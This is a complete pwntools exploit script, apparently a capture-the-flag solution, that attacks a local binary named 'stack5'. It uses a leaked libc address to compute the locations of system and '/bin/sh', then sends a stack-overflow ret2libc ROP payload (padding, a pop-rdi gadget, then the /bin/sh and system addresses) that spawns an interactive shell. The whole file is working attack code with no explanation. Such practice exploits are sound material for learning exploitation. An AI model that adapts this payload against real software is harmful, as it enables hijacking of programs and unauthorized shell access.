from pwn import *

io = process("./stack5")

# io = gdb.debug(['./stack5'], "b print_name")


io.recvuntil("gift: ")

stdout_addr = int(io.recvline().strip(), 16)

libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

libc.address = stdout_addr - 0x3c5620

# print("stdout addr", hex(stdout_addr))

# system_addr = stdout_addr - 0x380280

# print("system addr", hex(system_addr))

# binsh_addr = system_addr + 1342071

system_addr = libc.symbols['system']
binsh_addr = libc.search("/bin/sh\0").next()


payload = 'a'*0x28 + p64(0x0000000000400773) + p64(binsh_addr) + p64(system_addr)


io.sendlineafter(" name plz", payload)

io.interactive()
